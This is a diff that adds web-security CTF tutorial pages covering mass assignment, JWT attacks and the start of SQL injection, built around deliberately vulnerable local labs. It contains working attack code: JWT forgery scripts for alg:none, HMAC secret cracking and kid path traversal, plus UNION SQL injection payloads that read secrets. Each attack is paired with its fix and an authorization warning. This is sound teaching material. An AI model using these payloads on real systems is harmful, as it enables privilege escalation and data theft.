+<pre><code class="language-python">if not user:
+    return js({&quot;error&quot;: &quot;sign in&quot;}, 401)
+if USERS[user] != &quot;manager&quot;:
+    return js({&quot;error&quot;: &quot;forbidden&quot;}, 403)
+</code></pre>
+<p>For larger applications, role requirements are often safer when attached centrally to routes or policies rather than copied into individual handlers.</p>
+<h3 id="interpreting-an-identity-swap">Interpreting an identity swap</h3>
+<p>After replaying a request as another user, read the body as well as the status:</p>
+<ul>
+<li><code>200</code> with Alice’s data means broken authorization.</li>
+<li><code>200</code> with Bob’s correctly scoped data may be safe.</li>
+<li><code>401</code> means Bob’s credential was missing or unusable.</li>
+<li><code>403</code> usually means the authorization control worked.</li>
+</ul>
+<p>A <code>200</code> alone is not enough to report a vulnerability. You must determine whose data or action the response represents.</p>
+<h2 id="lab-9-add-a-field-the-form-never-offered">Lab 9: add a field the form never offered</h2>
+<p>Lab 8 changed the user sending a request. Lab 9 keeps the user but changes the shape of the object being created.</p>
+<p>Start the signup lab:</p>
+<pre><code class="language-bash">$ ./run.sh 09
+</code></pre>
+<p>Open the homepage with capture enabled:</p>
+<pre><code class="language-bash">$ h5i browser open 'http://127.0.0.1:9090/' \
+  --session lab09 --new --capture
+</code></pre>
+<p>The page documents a registration endpoint that expects:</p>
+<pre><code class="language-json">{
+  &quot;username&quot;: &quot;newuser&quot;,
+  &quot;email&quot;: &quot;newuser@example.test&quot;,
+  &quot;password&quot;: &quot;hunter2&quot;
+}
+</code></pre>
+<p>Create a normal account first:</p>
+<pre><code class="language-bash">$ h5i websec replay req_0 --session lab09 --create \
+  --set method=POST \
+  --set path=/api/register \
+  --set header.Content-Type=application/json \
+  --set json.username=ordinary \
+  --set json.email=ordinary@example.test \
+  --set json.password=hunter2
+</code></pre>
+<p>The response contains a bearer token. Copy it and try the admin endpoint:</p>
+<pre><code class="language-bash">$ h5i websec show res_1 --session lab09 --raw
+$ NORMAL_TOKEN='PASTE_THE_TOKEN_HERE'
+</code></pre>
+<pre><code class="language-bash">$ h5i websec replay req_0 --session lab09 --create \
+  --set path=/api/admin/keys \
+  --set &quot;header.Authorization=Bearer $NORMAL_TOKEN&quot;
+</code></pre>
+<p>The normal account receives <code>403 Forbidden</code>, as expected.</p>
+<h3 id="what-is-mass-assignment">What is mass assignment?</h3>
+<p>Many frameworks can convert request fields into an application object automatically. That is convenient until the internal object contains fields that an ordinary user should never control.</p>
+<p>For example, the public form may send <code>username</code>, <code>email</code>, and <code>password</code>, while the stored user record also contains:</p>
+<pre><code class="language-json">{
+  &quot;plan&quot;: &quot;free&quot;,
+  &quot;is_admin&quot;: false,
+  &quot;credits&quot;: 0
+}
+</code></pre>
+<p>If the server copies every supplied field into that record, we can submit <code>is_admin</code> ourselves even though the form never displayed it. This vulnerability is called <strong>mass assignment</strong>, <strong>over-posting</strong>, or <strong>unsafe object binding</strong>.</p>
+<p>Register a second user and add the privileged field:</p>
+<pre><code class="language-bash">$ h5i websec replay req_0 --session lab09 --create \
+  --set method=POST \
+  --set path=/api/register \
+  --set header.Content-Type=application/json \
+  --set json.username=climber \
+  --set json.email=climber@example.test \
+  --set json.password=hunter2 \
+  --set json.is_admin=true
+</code></pre>
+<p>Notice that <code>true</code> is not quoted. h5i sends it as a JSON boolean:</p>
+<pre><code class="language-json">&quot;is_admin&quot;: true
+</code></pre>
+<p>Copy the new token from the registration response and send it to the admin endpoint:</p>
+<pre><code class="language-bash">$ h5i websec show res_3 --session lab09 --raw
+$ ADMIN_TOKEN='PASTE_THE_NEW_TOKEN_HERE'
+</code></pre>
+<pre><code class="language-bash">$ h5i websec replay req_0 --session lab09 --create \
+  --set path=/api/admin/keys \
+  --set &quot;header.Authorization=Bearer $ADMIN_TOKEN&quot;
+</code></pre>
+<p>The response now contains:</p>
+<pre><code class="language-text">FLAG{mass_assignment}
+</code></pre>
+<p>We did not change a user after registration. We created an account that was already an administrator.</p>
+<h3 id="why-did-this-work_1">Why did this work?</h3>
+<p>The vulnerable code merges the entire request body into the default user:</p>
+<pre><code class="language-python">DEFAULTS = {
+    &quot;username&quot;: &quot;&quot;,
+    &quot;email&quot;: &quot;&quot;,
+    &quot;password&quot;: &quot;&quot;,
+    &quot;plan&quot;: &quot;free&quot;,
+    &quot;is_admin&quot;: False,
+    &quot;credits&quot;: 0,
+}
+
+row = {**DEFAULTS, **payload}
+USERS[row[&quot;username&quot;]] = row
+</code></pre>
+<p>In Python, values appearing later in this merge replace earlier values. Therefore, the attacker-supplied <code>is_admin: true</code> overwrites the safe default.</p>
+<p>The server should select the allowed public fields explicitly:</p>
+<pre><code class="language-python">allowed = {&quot;username&quot;, &quot;email&quot;, &quot;password&quot;}
+public = {k: v for k, v in payload.items() if k in allowed}
+row = {**DEFAULTS, **public}
+</code></pre>
+<p>An allowlist says which fields a caller may set. A blocklist says which known fields they may not set—and silently becomes incomplete when a new sensitive field is added later.</p>
+<h3 id="where-to-look-for-hidden-fields">Where to look for hidden fields</h3>
+<p>When the source is unavailable, field names often appear in:</p>
+<ul>
+<li>registration and profile responses;</li>
+<li><code>GET /api/me</code> or user-detail endpoints;</li>
+<li>JavaScript state embedded in a page;</li>
+<li>update requests sent by an administrator;</li>
+<li>error messages and API documentation.</li>
+</ul>
+<p>Common candidates include <code>role</code>, <code>is_admin</code>, <code>is_staff</code>, <code>verified</code>, <code>plan</code>, <code>credits</code>, <code>owner_id</code>, and <code>tenant_id</code>.</p>
+<p>Test create and update endpoints separately. A signup endpoint may use an allowlist while <code>PATCH /api/me</code> binds the entire request into an existing database record.</p>
+<h2 id="a-reusable-authorization-workflow">A reusable authorization workflow</h2>
+<p>The two labs produce a compact testing method:</p>
+<ol>
+<li>Keep one named h5i session per user or role.</li>
+<li>Capture a legitimate sensitive request from the privileged session.</li>
+<li>Replay it with <code>--as</code> for every lower-privileged session.</li>
+<li>Check whose data was returned—not only the status code.</li>
+<li>For create and update requests, add one plausible internal field at a time.</li>
+<li>Confirm impact with an unauthorized read, write, or privileged action.</li>
+</ol>
+<p>Named sessions matter because mixed cookie jars produce ambiguous evidence. If Alice’s credential accidentally remains in Bob’s request, a successful response proves nothing.</p>
+<h2 id="summary">Summary</h2>
+<p>Lab 8 showed an endpoint that authenticated Bob but never checked his role. h5i’s <code>--as</code> option let us keep Alice’s recorded request constant while replacing the sending identity.</p>
+<p>Lab 9 showed a registration endpoint that accepted every JSON field and copied it into the user record. Adding <code>is_admin: true</code> turned an ordinary signup into an administrator account.</p>
+<p>The shared lesson is that the client does not define the security boundary. A hidden link can still be requested, and a hidden field can still be submitted. The server must authorize every sensitive action and allowlist every client-controlled field.</p>
+<p>When finished:</p>
+<pre><code class="language-bash">$ h5i browser close --session alice
+$ h5i browser close --session bob
+$ h5i browser close --session lab09
+$ ./run.sh stop
+</code></pre>
+<p>In <a href="/guides/jwt-attacks/">JWT Attacks</a>, we will examine JSON Web Tokens and attack the code that decides whether a token’s signature should be trusted.</p>
+<h2 id="references">References</h2>
+<ul>
+<li><a href="https://github.com/h5i-dev/h5i">h5i</a></li>
+<li><a href="https://github.com/h5i-dev/h5i-tutorial/tree/main/websec">h5i-tutorial: Web application security</a></li>
+<li><a href="https://github.com/h5i-dev/h5i-tutorial/tree/main/websec/labs/08-cross-session-authz">Lab 8: Cross-session authorization</a></li>
+<li><a href="https://github.com/h5i-dev/h5i-tutorial/tree/main/websec/labs/09-mass-assignment">Lab 9: Mass assignment</a></li>
+</ul>""",
+}
+
+
+JWT = {
+    "section": "guides", "slug": "jwt-attacks", "published": "2026-09-13",
+    "eyebrow": "Tutorial 03 / Tokens", "time": "9 min",
+    "tags": "JWT &middot; alg confusion &middot; kid injection &middot; Labs 10&ndash;11",
+    "title": "JWT Attacks | h5i web security tutorial",
+    "h1": "JWT Attacks",
+    "description": "A beginner-friendly CTF tutorial: decode JSON Web Tokens, bypass a missing signature check, crack a weak HMAC secret, and turn a key identifier into a path traversal.",
+    "meta": "Decode JSON Web Tokens, bypass a missing signature check, crack a weak HMAC secret, and turn a key identifier into a path traversal.",
+    "deck": "A beginner-friendly CTF tutorial: decode JSON Web Tokens, bypass a missing signature check, crack a weak HMAC secret, and turn a key identifier into a path traversal.",
+    "next": ("/guides/sql-injection/", "Next in the series", "SQL Injection", "Turn a broken search query into a database read, then extract secrets when the application reveals only a boolean or only its response time."),
+    "cta": ("Run the labs yourself", "42 deliberately vulnerable applications, one binary, no Docker and no accounts.", "https://github.com/h5i-dev/h5i-tutorial", "Open h5i-tutorial"),
+    "body": r"""<p>In <a href="/guides/broken-access-control/">Broken Access Control</a>, we tested access control by changing the user and the fields in a request. In this article, we will attack a different part of authentication: the token that tells the server who the user is.</p>
+<p>Using Labs 10 and 11 of <a href="https://github.com/h5i-dev/h5i-tutorial/tree/main/websec">h5i-tutorial</a>, we will learn:</p>
+<ul>
+<li>what the three parts of a JSON Web Token mean;</li>
+<li>why decoding a JWT does not verify it;</li>
+<li>how <code>alg: none</code> can make a signature optional;</li>
+<li>why a weak HMAC secret can be tested offline; and</li>
+<li>how an unsafe <code>kid</code> lookup can let an attacker choose the verification key.</li>
+</ul>
+<p>We will use <a href="https://github.com/h5i-dev/h5i">h5i</a> to capture a real token, construct modified versions, and replay a request with a different <code>Authorization</code> header.</p>
+<p>The targets are deliberately vulnerable local labs. Only test systems you own or have explicit permission to assess.</p>
+<h2 id="before-we-begin">Before we begin</h2>
+<p>You need Python 3.11 or later, h5i, and the <code>websec</code> plugin. See the <a href="https://github.com/h5i-dev/h5i-tutorial/tree/main/websec#1-setup">course setup</a> for installation details.</p>
+<pre><code class="language-bash">$ git clone https://github.com/h5i-dev/h5i-tutorial.git
+$ cd h5i-tutorial/websec
+$ h5i websec --help
+</code></pre>
+<h2 id="what-is-a-jwt">What is a JWT?</h2>
+<p>A <strong>JSON Web Token</strong>, or <strong>JWT</strong>, is a compact string commonly used to carry claims about a user. A token usually looks like this:</p>
+<pre><code class="language-text">eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJndWVzdCIsInJvbGUiOiJndWVzdCJ9.signature
+</code></pre>
+<p>It has three dot-separated parts:</p>
+<pre><code class="language-text">header.payload.signature
+</code></pre>
+<p>The <strong>header</strong> describes how the token is signed. The <strong>payload</strong> contains claims such as the user ID, role, issuer, and expiration time. The <strong>signature</strong> lets the server detect changes to the first two parts.</p>
+<p>The header and payload are normally Base64url-encoded. Base64 is an encoding, not encryption. Anyone holding the token can decode and modify those sections. Security comes from the server verifying the signature with the correct algorithm and key.</p>
+<p>That verification step is exactly what we will test.</p>
+<h2 id="lab-10-inspect-the-guest-token">Lab 10: inspect the guest token</h2>
+<p>Start the Passport lab:</p>
+<pre><code class="language-bash">$ ./run.sh 10
+</code></pre>
+<p>Open the token endpoint:</p>
+<pre><code class="language-bash">$ h5i browser open 'http://127.0.0.1:9100/api/token' \
+  --session lab10 --new --capture
+$ h5i websec show res_0 --session lab10 --raw
+</code></pre>
+<p>The response contains a guest JWT. Copy the token into a shell variable:</p>
+<pre><code class="language-bash">$ TOKEN='PASTE_THE_TOKEN_HERE'
+</code></pre>
+<p>Decode its header and payload:</p>
+<pre><code class="language-bash">$ TOKEN=&quot;$TOKEN&quot; python3 - &lt;&lt;'PY'
+import base64
+import json
+import os
+
+token = os.environ[&quot;TOKEN&quot;]
+decode = lambda part: base64.urlsafe_b64decode(
+    part + &quot;=&quot; * (-len(part) % 4)
+)
+
+header, payload, signature = token.split(&quot;.&quot;)
+print(json.loads(decode(header)))
+print(json.loads(decode(payload)))
+print(&quot;signature bytes:&quot;, len(decode(signature)))
+PY
+</code></pre>
+<p>The result is similar to:</p>
+<pre><code class="language-text">{'alg': 'HS256', 'typ': 'JWT'}
+{'sub': 'guest', 'role': 'guest', 'iss': 'passport'}
+signature bytes: 32
+</code></pre>
+<p><code>HS256</code> means the server uses HMAC with SHA-256. The server and token issuer share a secret key. The header and payload are signed using that key, and the server should reject any token whose signature does not match.</p>
+<h2 id="attack-1-make-the-signature-optional">Attack 1: make the signature optional</h2>
+<p>The JWT header is attacker-controlled input. A dangerous verifier may read the algorithm from that header and accept <code>none</code>, meaning no cryptographic signature.</p>
+<p>Create a token whose payload claims the <code>admin</code> role:</p>
+<pre><code class="language-bash">$ FORGED=$(python3 - &lt;&lt;'PY'
+import base64
+import json
+
+def part(obj):
+    raw = json.dumps(obj, separators=(&quot;,&quot;, &quot;:&quot;)).encode()
+    return base64.urlsafe_b64encode(raw).rstrip(b&quot;=&quot;).decode()
+
+header = part({&quot;alg&quot;: &quot;none&quot;, &quot;typ&quot;: &quot;JWT&quot;})
+payload = part({
+    &quot;sub&quot;: &quot;guest&quot;,
+    &quot;role&quot;: &quot;admin&quot;,
+    &quot;iss&quot;: &quot;passport&quot;,
+})
+print(header + &quot;.&quot; + payload + &quot;.&quot;)
+PY
+)
+</code></pre>
+<p>The trailing dot matters. It leaves the third, signature segment empty while preserving the three-part JWT structure.</p>
+<p>Replay the captured request, changing its path and adding the token:</p>
+<pre><code class="language-bash">$ h5i websec replay req_0 --session lab10 --create \
+  --set path=/api/vault \
+  --set &quot;header.Authorization=Bearer $FORGED&quot;
+</code></pre>
+<p>Note the <code>seq</code> in the replay output and inspect the corresponding response:</p>
+<pre><code class="language-bash">$ h5i websec show res_1 --session lab10 --raw
+</code></pre>
+<p>The response contains:</p>
+<pre><code class="language-text">FLAG{jwt_alg_confusion}
+</code></pre>
+<p>We changed the role without knowing any secret because the verifier accepted a token with no signature.</p>
+<h3 id="why-did-this-work">Why did this work?</h3>
+<p>The vulnerable verifier reads <code>alg</code> from the untrusted token:</p>
+<pre><code class="language-python">alg = head.get(&quot;alg&quot;, &quot;HS256&quot;)
+
+if alg.lower() == &quot;none&quot;:
+    return claims
+</code></pre>
+<p>The <code>none</code> branch returns the claims before verifying a signature. The attacker therefore controls both the decision to skip verification and the claims returned after it.</p>
+<p>The server must choose the accepted algorithm. The token must not choose how its own authenticity will be checked.</p>
+<h2 id="attack-2-crack-a-weak-hmac-secret">Attack 2: crack a weak HMAC secret</h2>
+<p>Lab 10 contains a second, independent weakness. Even when it follows the <code>HS256</code> path, the signing secret is a dictionary word.</p>
+<p>An HMAC JWT gives us everything required to test candidate secrets locally:</p>
+<ul>
+<li>the encoded header and payload;</li>
+<li>the correct signature; and</li>
+<li>the signing algorithm.</li>
+</ul>
+<p>Testing guesses requires no further requests to the server. This is an <strong>offline attack</strong>, so login rate limits do not help.</p>
+<p>Try a small wordlist against the original guest token:</p>
+<pre><code class="language-bash">$ SECRET=$(TOKEN=&quot;$TOKEN&quot; python3 - &lt;&lt;'PY'
+import base64
+import hashlib
+import hmac
+import os
+
+token = os.environ[&quot;TOKEN&quot;]
+signed, _, signature = token.rpartition(&quot;.&quot;)
+
+def b64(raw):
+    return base64.urlsafe_b64encode(raw).rstrip(b&quot;=&quot;).decode()
+
+words = [
+    &quot;secret&quot;,
+    &quot;password&quot;,
+    &quot;changeme&quot;,
+    &quot;letmein&quot;,
+    &quot;jwt&quot;,
+    &quot;key&quot;,
+    &quot;admin&quot;,
+    &quot;test&quot;,
+]
+
+for word in words:
+    candidate = hmac.new(
+        word.encode(),
+        signed.encode(),
+        hashlib.sha256,
+    ).digest()
+    if hmac.compare_digest(b64(candidate), signature):
+        print(word)
+        break
+PY
+)
+
+$ printf '%s\n' &quot;$SECRET&quot;
+letmein
+</code></pre>
+<p>Now use that secret to create a correctly signed admin token:</p>
+<pre><code class="language-bash">$ SIGNED_ADMIN=$(SECRET=&quot;$SECRET&quot; python3 - &lt;&lt;'PY'
+import base64
+import hashlib
+import hmac
+import json
+import os
+
+def b64(raw):
+    return base64.urlsafe_b64encode(raw).rstrip(b&quot;=&quot;).decode()
+
+def part(obj):
+    return b64(json.dumps(obj, separators=(&quot;,&quot;, &quot;:&quot;)).encode())
+
+header = part({&quot;alg&quot;: &quot;HS256&quot;, &quot;typ&quot;: &quot;JWT&quot;})
+payload = part({
+    &quot;sub&quot;: &quot;guest&quot;,
+    &quot;role&quot;: &quot;admin&quot;,
+    &quot;iss&quot;: &quot;passport&quot;,
+})
+signed = header + &quot;.&quot; + payload
+signature = hmac.new(
+    os.environ[&quot;SECRET&quot;].encode(),
+    signed.encode(),
+    hashlib.sha256,
+).digest()
+
+print(signed + &quot;.&quot; + b64(signature))
+PY
+)
+</code></pre>
+<p>Send it to the same endpoint:</p>
+<pre><code class="language-bash">$ h5i websec replay req_0 --session lab10 --create \
+  --set path=/api/vault \
+  --set &quot;header.Authorization=Bearer $SIGNED_ADMIN&quot;
+</code></pre>
+<p>This token passes the normal signature check. The vulnerability is no longer a missing check; it is a signing key that an attacker can recover cheaply.</p>
+<p>Use a randomly generated secret with enough entropy, store it outside source code, and rotate it when exposure is possible.</p>
+<h2 id="lab-11-when-kid-becomes-a-file-path">Lab 11: when <code>kid</code> becomes a file path</h2>
+<p>Start the Keyring lab:</p>
+<pre><code class="language-bash">$ ./run.sh 11
+</code></pre>
+<p>Open its token endpoint and inspect the returned JWT:</p>
+<pre><code class="language-bash">$ h5i browser open 'http://127.0.0.1:9110/api/token' \
+  --session lab11 --new --capture
+$ h5i websec show res_0 --session lab11 --raw
+</code></pre>
+<p>Decode the token as before. This header contains an additional field:</p>
+<pre><code class="language-json">{
+  &quot;alg&quot;: &quot;HS256&quot;,
+  &quot;typ&quot;: &quot;JWT&quot;,
+  &quot;kid&quot;: &quot;main.key&quot;
+}
+</code></pre>
+<p><code>kid</code> means <strong>key ID</strong>. It lets a verifier choose among multiple signing keys, which is useful during key rotation.</p>
+<p>The danger is that the value comes from the untrusted token. The server must map it to a known key safely.</p>
+<p>In this lab, it does not:</p>
+<pre><code class="language-python">def key_for(kid):
+    return (ROOT / &quot;keys&quot; / kid).read_bytes()
+</code></pre>
+<p>The server treats <code>kid</code> as part of a filesystem path. Therefore:</p>
+<pre><code class="language-text">../static/brand.txt
+</code></pre>
+<p>escapes the <code>keys</code> directory and selects a public static file as the HMAC key.</p>
+<p>We do not need to read the real secret key. We need to make the verifier use a file whose bytes we already know.</p>
+<h3 id="save-the-exact-key-bytes">Save the exact key bytes</h3>
+<p>Fetch the public brand file through the same captured session:</p>
+<pre><code class="language-bash">$ h5i websec replay req_0 --session lab11 \
+  --set path=/static/brand.txt
+
+$ WORK=$(mktemp -d)
+$ h5i websec show res_1 --session lab11 \
+  --body-to &quot;$WORK/brand.txt&quot;
+</code></pre>
+<p><code>--body-to</code> writes the response body exactly as received. That matters because the file includes a trailing newline. Copying visible terminal text can lose that byte and produce the wrong HMAC.</p>
+<p>Now create an admin token whose <code>kid</code> points to the public file:</p>
+<pre><code class="language-bash">$ FORGED=$(python3 - &quot;$WORK/brand.txt&quot; &lt;&lt;'PY'
+import base64
+import hashlib
+import hmac
+import json
+import sys
+
+key = open(sys.argv[1], &quot;rb&quot;).read()
+
+def b64(raw):
+    return base64.urlsafe_b64encode(raw).rstrip(b&quot;=&quot;).decode()
+
+def part(obj):
+    return b64(json.dumps(obj, separators=(&quot;,&quot;, &quot;:&quot;)).encode())
+
+header = part({
+    &quot;alg&quot;: &quot;HS256&quot;,
+    &quot;typ&quot;: &quot;JWT&quot;,
+    &quot;kid&quot;: &quot;../static/brand.txt&quot;,
+})
+payload = part({&quot;sub&quot;: &quot;guest&quot;, &quot;role&quot;: &quot;admin&quot;})
+signed = header + &quot;.&quot; + payload
+signature = hmac.new(key, signed.encode(), hashlib.sha256).digest()
+
+print(signed + &quot;.&quot; + b64(signature))
+PY
+)
+</code></pre>
+<p>Send it to the protected HSM endpoint:</p>
+<pre><code class="language-bash">$ h5i websec replay req_0 --session lab11 --create \
+  --set path=/api/hsm \
+  --set &quot;header.Authorization=Bearer $FORGED&quot;
+</code></pre>
+<p>The response contains:</p>
+<pre><code class="language-text">FLAG{jwt_kid_injection}
+</code></pre>
+<p>The signature is cryptographically valid. The bug is that the attacker selected the key used to validate it.</p>
+<h3 id="fixing-key-selection">Fixing key selection</h3>
+<p>The safe pattern is a fixed server-side map:</p>
+<pre><code class="language-python">KEYS = {
+    &quot;main-2026&quot;: current_key,
+    &quot;main-2025&quot;: previous_key,
+}
+
+key = KEYS.get(header.get(&quot;kid&quot;))
+if key is None:
+    reject()
+</code></pre>
+<p>Reject unknown identifiers. Do not concatenate <code>kid</code> into a path, SQL query, shell command, or arbitrary URL.</p>
+<p>JWT headers such as <code>jku</code> and <code>x5u</code> can name remote key locations. A verifier should ignore them unless the application has a strict, server-controlled allowlist and a genuine need to fetch keys remotely.</p>
+<h2 id="a-reusable-jwt-testing-method">A reusable JWT testing method</h2>
+<p>When an application gives you a JWT:</p>
+<ol>
+<li>Decode the header and payload without assuming they are trustworthy.</li>
+<li>Identify the algorithm and every key-selection field.</li>
+<li>Check whether the verifier accepts an unsigned token.</li>
+<li>If HMAC is used, test whether the secret is weak—offline.</li>
+<li>Follow <code>kid</code>, <code>jku</code>, and <code>x5u</code> into the code or behavior that resolves the key.</li>
+<li>Check important claims such as issuer, audience, and expiration.</li>
+<li>Confirm the result by reaching a protected action, not merely by creating a token-shaped string.</li>
+</ol>
+<p>Do not report “the JWT can be decoded.” That is normal. The finding begins when modified claims pass verification or when a token is accepted outside the context for which it was issued.</p>
+<h2 id="summary">Summary</h2>
+<p>Lab 10 showed two independent JWT failures. <code>alg: none</code> allowed us to omit the signature, while a weak HMAC secret allowed us to generate a valid signature ourselves.</p>
+<p>Lab 11 used a valid HMAC construction with a dangerous key lookup. By placing <code>../static/brand.txt</code> in <code>kid</code>, we made the server verify our token using public bytes.</p>
+<p>The common lesson is that cryptography does not rescue unsafe control flow. The server must fix the algorithm, validate all required claims, and select keys only from trusted server-side configuration.</p>
+<p>When finished:</p>
+<pre><code class="language-bash">$ h5i browser close --session lab10
+$ h5i browser close --session lab11
+$ rm -rf &quot;$WORK&quot;
+$ ./run.sh stop
+</code></pre>
+<p>In <a href="/guides/sql-injection/">SQL Injection</a>, we will move from authentication to SQL injection, beginning with visible database errors and ending with secrets extracted one bit—or one delay—at a time.</p>
+<h2 id="references">References</h2>
+<ul>
+<li><a href="https://github.com/h5i-dev/h5i">h5i</a></li>
+<li><a href="https://github.com/h5i-dev/h5i-tutorial/tree/main/websec">h5i-tutorial: Web application security</a></li>
+<li><a href="https://github.com/h5i-dev/h5i-tutorial/tree/main/websec/labs/10-jwt-alg-confusion">Lab 10: JWT algorithm confusion</a></li>
+<li><a href="https://github.com/h5i-dev/h5i-tutorial/tree/main/websec/labs/11-jwt-kid-injection">Lab 11: JWT <code>kid</code> injection</a></li>
+</ul>""",
+}
+
+
+SQLI = {
+    "section": "guides", "slug": "sql-injection", "published": "2026-09-15",
+    "eyebrow": "Tutorial 04 / Injection", "time": "11 min",
+    "tags": "SQLi &middot; Boolean and timing oracles &middot; Labs 12&ndash;14",
+    "title": "SQL Injection | h5i web security tutorial",
+    "h1": "SQL Injection",
+    "description": "A beginner-friendly CTF tutorial: turn a broken search query into a database read, then extract secrets when the application reveals only a boolean—or only its response time.",
+    "meta": "Turn a broken search query into a database read, then extract secrets when the application reveals only a boolean or only its response time.",
+    "deck": "A beginner-friendly CTF tutorial: turn a broken search query into a database read, then extract secrets when the application reveals only a boolean—or only its response time.",
+    "next": ("/guides/injection-beyond-sql/", "Next in the series", "Injection Beyond SQL", "The same mistake in five interpreters: NoSQL operators, shell commands, server-side templates, XML entities, and stored input."),
+    "cta": ("Run the labs yourself", "42 deliberately vulnerable applications, one binary, no Docker and no accounts.", "https://github.com/h5i-dev/h5i-tutorial", "Open h5i-tutorial"),
+    "body": r"""<p>In <a href="/guides/jwt-attacks/">JWT Attacks</a>, we modified authentication tokens and tested whether the server verified them correctly. In this article, we will follow user input across another trust boundary: from an HTTP request into a database query.</p>
+<p>Using Labs 12–14 of <a href="https://github.com/h5i-dev/h5i-tutorial/tree/main/websec">h5i-tutorial</a>, we will learn three forms of SQL injection:</p>
+<ul>
+<li><strong>UNION-based SQL injection</strong>, where database rows appear in the response;</li>
+<li><strong>boolean-based blind SQL injection</strong>, where the application reveals one bit through <code>true</code> or <code>false</code>; and</li>
+<li><strong>time-based blind SQL injection</strong>, where the response body never changes but its timing does.</li>
+</ul>
+<p>We will use <a href="https://github.com/h5i-dev/h5i">h5i</a> to capture normal requests, change one query parameter, and measure differences in status, size, and response time.</p>
+<p>These are deliberately vulnerable local labs. SQL injection can expose or destroy real data, so only test systems you own or have explicit authorization to assess.</p>
+<h2 id="before-we-begin">Before we begin</h2>
+<p>You need Python 3.11 or later, h5i, and its <code>websec</code> plugin. The <a href="https://github.com/h5i-dev/h5i-tutorial/tree/main/websec#1-setup">tutorial README</a> contains the complete setup.</p>
+<pre><code class="language-bash">$ git clone https://github.com/h5i-dev/h5i-tutorial.git
+$ cd h5i-tutorial/websec
+$ h5i websec --help
+</code></pre>
+<h2 id="what-is-sql-injection">What is SQL injection?</h2>
+<p>Applications use SQL to read and modify relational databases. A safe query keeps its instructions separate from user-supplied values.</p>
+<p>For example:</p>
+<pre><code class="language-python">db.execute(
+    &quot;SELECT id, name, price FROM products WHERE name LIKE ?&quot;,
+    (f&quot;%{search}%&quot;,),
+)
+</code></pre>
+<p>The question mark is a parameter placeholder. The database treats <code>search</code> as data, even when it contains quotes or SQL keywords.</p>
+<p>A vulnerable application may instead construct the query as text:</p>
+<pre><code class="language-python">sql = (
+    &quot;SELECT id, name, price FROM products &quot;
+    f&quot;WHERE name LIKE '%{search}%'&quot;
+)
+</code></pre>
+<p>If <code>search</code> contains a quote, it can end the string literal and turn the remaining input into SQL syntax. This is <strong>SQL injection</strong>.</p>
+<h2 id="lab-12-make-the-database-print-another-table">Lab 12: make the database print another table</h2>
+<p>Start the catalogue lab:</p>
+<pre><code class="language-bash">$ ./run.sh 12
+</code></pre>
+<p>Open a normal product search:</p>
+<pre><code class="language-bash">$ h5i browser open \
+  'http://127.0.0.1:9120/api/products?q=compass' \
+  --session lab12 --new --capture
+$ h5i websec show res_0 --session lab12 --raw
+</code></pre>
+<p>The response contains two products whose names include “compass.” Before trying a full payload, send one quote:</p>
+<pre><code class="language-bash">$ h5i websec replay req_0 --session lab12 \
+  --set &quot;query.q=compass'&quot;
+$ h5i websec show res_1 --session lab12 --raw
+</code></pre>
+<p>The application returns <code>500</code> and shows the query it attempted:</p>
+<pre><code class="language-json">{
+  &quot;error&quot;: &quot;unrecognized token: \&quot;'\&quot;&quot;,
+  &quot;sql&quot;: &quot;SELECT id, name, price FROM products WHERE name LIKE '%compass'%'&quot;
+}
+</code></pre>
+<p>Our quote ended the original string early. The final <code>%'</code> supplied by the application is now misplaced SQL syntax.</p>
+<p>A single error is a lead, not yet proof. A stronger test compares opposite conditions:</p>
+<pre><code class="language-bash">$ h5i websec replay req_0 --session lab12 \
+  --set &quot;query.q=compass%' AND '1'='1' -- &quot;
+
+$ h5i websec replay req_0 --session lab12 \
+  --set &quot;query.q=compass%' AND '1'='2' -- &quot;
+</code></pre>
+<p>If the first retains the original results and the second removes them, our input changed the query’s logic—not merely its syntax.</p>
+<h3 id="count-the-result-columns">Count the result columns</h3>
+<p>SQL’s <code>UNION</code> operator combines rows from two queries. Both sides must return the same number of columns in compatible positions.</p>
+<p>The normal response contains <code>id</code>, <code>name</code>, and <code>price</code>, suggesting three columns. We can verify that with <code>ORDER BY</code>:</p>
+<pre><code class="language-bash">$ for n in 1 2 3 4 5; do
+    printf '%s ' &quot;$n&quot;
+    h5i websec replay req_0 --session lab12 \
+      --reset-budget \
+      --set &quot;query.q=zz%' ORDER BY $n -- &quot; |
+      python3 -c 'import json,sys; print(json.load(sys.stdin)[&quot;response&quot;][&quot;status&quot;])'
+  done
+</code></pre>
+<p>The result is:</p>
+<pre><code class="language-text">1 200
+2 200
+3 200
+4 500
+5 500
+</code></pre>
+<p>Ordering by the fourth column fails, so the original query returns three columns.</p>
+<h3 id="discover-the-table">Discover the table</h3>
+<p>This lab uses SQLite. SQLite stores information about tables in <code>sqlite_master</code>. Inject a second three-column query:</p>
+<pre><code class="language-bash">$ h5i websec replay req_0 --session lab12 \
+  --set &quot;query.q=zz%' UNION SELECT 1, name, 0 FROM sqlite_master WHERE type='table' -- &quot;
+</code></pre>
+<p>Note the <code>seq</code> from the replay output and inspect its <code>res_N</code>. The result lists both <code>products</code> and <code>api_keys</code>.</p>
+<p>The leading <code>zz%</code> makes the original product search return no rows. This keeps the output focused on rows introduced by our <code>UNION</code>.</p>
+<p>Now read the secret:</p>
+<pre><code class="language-bash">$ h5i websec replay req_0 --session lab12 \
+  --set &quot;query.q=zz%' UNION SELECT id, secret, 0 FROM api_keys -- &quot;
+</code></pre>
+<p>Inspect the new response. The injected row contains:</p>
+<pre><code class="language-text">FLAG{sqli_union}
+</code></pre>
+<p>The <code>--</code> at the end comments out the remaining quote and percent sign from the original query. Keeping a space after <code>--</code> also makes the payload compatible with SQL engines that require whitespace after the comment marker.</p>
+<h3 id="why-did-this-work">Why did this work?</h3>
+<p>The vulnerable handler directly inserts the search value into SQL:</p>
+<pre><code class="language-python">q = req.query.get(&quot;q&quot;, &quot;&quot;)
+sql = (
+    &quot;SELECT id, name, price FROM products &quot;
+    f&quot;WHERE name LIKE '%{q}%'&quot;
+)
+rows = db().execute(sql).fetchall()
+</code></pre>
+<p>The fix is parameterization:</p>
+<pre><code class="language-python">rows = db().execute(
+    &quot;SELECT id, name, price FROM products WHERE name LIKE ?&quot;,
+    (f&quot;%{q}%&quot;,),
+).fetchall()
+</code></pre>
+<p>Escaping individual dangerous characters is fragile. Parameterization prevents the value from becoming SQL syntax at all.</p>
+<h2 id="lab-13-extract-a-secret-through-a-boolean">Lab 13: extract a secret through a boolean</h2>
+<p>Lab 12 printed database rows in the response. Many applications do not.</p>
+<p>Start the waitlist lab:</p>
